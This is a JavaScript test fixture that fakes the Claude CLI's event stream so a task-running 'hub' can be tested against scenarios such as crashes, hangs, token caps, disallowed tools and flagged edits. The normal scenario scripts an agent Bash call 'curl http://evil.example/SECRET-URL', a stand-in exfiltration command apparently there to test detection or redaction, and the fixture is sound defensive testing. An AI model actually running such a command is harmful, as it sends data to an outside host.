// A fake Claude CLI for the hub tests (P5 R2). The runner spawns this with node in place of claude.exe. It makes no network call and no model call.
// It writes what it was given (arguments, a few environment facts, its priority, its working folder, the prompt from stdin) to HUB_FAKE_OUT as JSON, then plays the scenario in HUB_FAKE_SCENARIO.
// Event shapes follow what hub/watcher.js already parses (rate_limit_event, result); the assistant and init shapes are our best knowledge and are checked against a real run in R6.
import fs from 'node:fs';
import os from 'node:os';
import {spawn} from 'node:child_process';

const scenario=process.env.HUB_FAKE_SCENARIO||'normal',outFile=process.env.HUB_FAKE_OUT,pidFile=process.env.HUB_FAKE_PIDFILE;
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const emit=o=>process.stdout.write(JSON.stringify(o)+'\n');
let stdin='';for await(const c of process.stdin)stdin+=c;
if(outFile)fs.writeFileSync(outFile,JSON.stringify({argv:process.argv.slice(2),cwd:process.cwd(),stdin,priority:os.getPriority(),claudeEnv:Object.keys(process.env).filter(k=>/^CLAUDE/i.test(k)),electron:'ELECTRON_RUN_AS_NODE' in process.env,pid:process.pid}));

const tools=['Read','Grep','Glob','Edit','Write','Bash'];
const init=(t=tools)=>emit({type:'system',subtype:'init',session_id:'11111111-1111-4111-8111-111111111111',model:'claude-sonnet-5-5',tools:t});
const rate=(w=0.12,f=0.58)=>emit({type:'rate_limit_event',rate_limit_info:{unifiedWindows:{seven_day:{utilization:w,resetsAt:Math.floor(Date.now()/1000)+86400},five_hour:{utilization:f,resetsAt:Math.floor(Date.now()/1000)+3600}}}});
let n=0;
const msg=(content,usage={input_tokens:100,output_tokens:50,cache_creation_input_tokens:0,cache_read_input_tokens:9000},id)=>emit({type:'assistant',message:{id:id||'msg_'+(++n),role:'assistant',content,usage}});
const tool=(name,input)=>({type:'tool_use',id:'tu_'+(++n),name,input});
const text=t=>({type:'text',text:t});
const result=(o={})=>emit({type:'result',subtype:'success',is_error:false,num_turns:3,total_cost_usd:0.01,result:process.env.HUB_FAKE_RESULT||'Done. SECRET-MODEL-WORDS',usage:{},modelUsage:{'claude-sonnet-5-5':{}},...o});

if(scenario==='crash'){process.stderr.write('boom');process.exit(3)}
if(scenario==='silent')process.exit(0);
if(scenario==='violation'){init([...tools,'WebFetch']);msg([text('x')]);await sleep(60000)}
if(scenario==='hang'){init();rate();await sleep(60000)}
if(scenario==='grandchild'){
 const gc=spawn(process.execPath,['-e','require("fs").writeFileSync(process.argv[1],String(process.pid));setInterval(()=>{},1000)',pidFile],{stdio:'ignore'});
 init();await sleep(60000)}
if(scenario==='overcap'){init();rate();for(let i=0;i<50;i++){msg([text('working '+i)],{input_tokens:200000,output_tokens:0,cache_creation_input_tokens:0,cache_read_input_tokens:0});await sleep(40)}await sleep(60000)}
if(scenario==='gauge'){init();rate(0.96,0.2);for(let i=0;i<20;i++){msg([text('working')],{input_tokens:100000,output_tokens:0,cache_creation_input_tokens:0,cache_read_input_tokens:0});await sleep(40)}await sleep(60000)}
if(scenario==='pause'){init();rate(0.1,1.0);msg([text('x')],{input_tokens:10,output_tokens:0,cache_creation_input_tokens:0,cache_read_input_tokens:0});await sleep(60000)}
if(scenario==='split'){
 init();const line=JSON.stringify({type:'assistant',message:{id:'msg_s',content:[tool('Read',{file_path:'C:\\secret\\folder\\split.js'})],usage:{input_tokens:7,output_tokens:3}}})+'\n';
 process.stdout.write(line.slice(0,25));await sleep(80);process.stdout.write(line.slice(25));await sleep(80);result();process.exit(0)}
if(scenario==='flagged'){init();rate();msg([tool('Edit',{file_path:'hub/x.js'})]);msg([tool('Write',{file_path:'package.json'})]);msg([tool('Edit',{file_path:'dist/ok.js'})]);result();process.exit(0)}
if(scenario==='masterhang'){init(['Read','Grep','Glob']);rate();await sleep(60000)}
if(scenario==='master'){init(['Read','Grep','Glob']);rate();msg([tool('Read',{file_path:'PROJECT-BRIEF.md'}),tool('Grep',{pattern:'minimap'})]);const t=process.env.HUB_FAKE_REPLY||'Sounds good.\nPLAN:\n# Minimap in the corner\n\nBuild a round minimap.\n\n## Run\nmodel: sonnet\nwhy: builds against tests\nsize: M\nneeds: npm test\n';msg([text(t)],{input_tokens:1000,output_tokens:200,cache_creation_input_tokens:5000,cache_read_input_tokens:0});result({result:t});process.exit(0)}
if(scenario==='question'){init();rate();msg([text('I read the plan.\nQUESTION: Should the minimap be round or square?')]);process.exit(0)}
// normal
init();rate();
msg([text('Reading first. SECRET-MODEL-WORDS'),tool('Grep',{pattern:'minimap'})],undefined,'msg_a');
msg([tool('Read',{file_path:'C:\\Users\\X\\Documents\\simproject\\dist\\minimap.js'})],undefined,'msg_a'); // same message id: counted once
await sleep(30);
msg([tool('Edit',{file_path:'C:\\Users\\X\\Documents\\simproject\\dist\\minimap.js',old_string:'a',new_string:'b'})]);
msg([tool('Write',{file_path:'dist/style.css',content:'x'})]);
msg([tool('Bash',{command:'npm test'})]);
msg([tool('Bash',{command:'curl http://evil.example/SECRET-URL'})]);
msg([text('All done.')],{input_tokens:50,output_tokens:25,cache_creation_input_tokens:1000,cache_read_input_tokens:20000});
if(scenario==='work')await sleep(60000); // the normal tool events, then keeps working (for screenshots and Stop)
result();
